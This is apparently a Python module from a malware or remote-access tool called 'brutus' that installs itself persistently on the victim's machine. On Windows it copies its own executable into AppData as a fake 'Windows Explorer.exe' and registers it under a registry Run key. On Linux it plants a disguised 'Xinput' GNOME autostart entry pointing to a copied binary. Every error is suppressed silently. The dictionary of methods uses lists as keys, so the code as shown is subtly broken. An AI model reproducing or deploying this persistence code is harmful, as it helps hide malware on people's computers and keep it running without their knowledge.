"""This module implements a base class for cross-OS persistence support
"""
import os
import shutil
import stat
import subprocess
import sys

from brutus.utils.sys import OperatingSystem, get_os


class PersistenceExecutor:
    """The PersistenceExecutor manages persistence methods for a variety of OS types"""

    def __init__(self):
        self.persistence_methods = {
            [OperatingSystem.LINUX]: self.persist_linux,
            [OperatingSystem.WINDOWS]: self.persist_windows,
            [OperatingSystem.DARWIN]: self.persist_macos,
            [OperatingSystem.UNKNOWN]: self.fail_silently,
        }

    def fail_silently(self) -> None:
        """Silently fail"""

    def persist_macos(self) -> None:
        """Persistence method for MacOS"""

    def persist_windows(self) -> None:
        """Hides binary in Windows registry"""
        bin_loc = os.environ['appdata'] + '\\Windows Explorer.exe'

        if not os.path.exists(bin_loc):
            shutil.copyfile(sys.executable, bin_loc)
            try:
                subprocess.call(
                    'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v winexplorer /t REG_SZ /d "'  # noqa: W605,E501 pylint: disable=W1401,C0301
                    + bin_loc
                    + '"',
                    shell=True,
                )
            except:  # noqa: E722 pylint: disable=W0702
                self.fail_silently()

    def persist_linux(self) -> None:
        """Hides binary in Linux autostart directory

        TODO: this is for Gnome-based desktops; expand Linux persistence methods to
        other distros
        """
        home_conf_dir = os.path.expanduser('~') + '/.config/'
        autostart_path = home_conf_dir + '/autostart/'
        autostart_file = autostart_path + 'xinput.desktop'

        if not os.path.isfile(autostart_file):
            try:
                os.makedirs(autostart_path)
            except OSError:
                self.fail_silently()

            dest = home_conf_dir + 'xnput'
            shutil.copyfile(sys.executable, dest)

            self.add_executable_perms(dest)

            with open(autostart_file, 'w') as out:
                out.write(
                    '[Desktop Entry]\nType=Application\nX-GNOME-Autostart-enabled=true\n'  # noqa: E501 pylint: disable=C0301
                )
                out.write('Name=Xinput\nExec=' + dest + '\n')

            self.add_executable_perms(autostart_file)

            try:
                subprocess.Popen(dest)
            except Exception:  # pylint: disable=W0703
                self.fail_silently()

            sys.exit()

    def add_executable_perms(self, file: str):
        """Adds executable permissions to a file

        Args:
            file (str)
        """
        os.chmod(file, os.stat(file).st_mode | stat.S_IEXEC)

    def persist(self):
        """Persist the binary using the respective
        persistence method for the host machine's OS type
        """
        self.persistence_methods[get_os()]()
